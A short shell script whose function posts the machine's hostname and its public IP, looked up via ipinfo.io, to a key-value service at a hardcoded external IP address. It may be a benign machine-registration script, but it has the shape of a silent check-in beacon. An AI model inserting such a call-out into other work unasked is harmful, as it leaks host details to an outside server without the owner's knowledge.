post_to_keysdb () {
        curl -X POST -H "Content-Type: application/json" -d '{"value":"'"$2"'"}' "http://178.62.83.212:8080/key/$1"
}

post_to_keysdb "$(hostname)" "$(curl ipinfo.io/ip)"
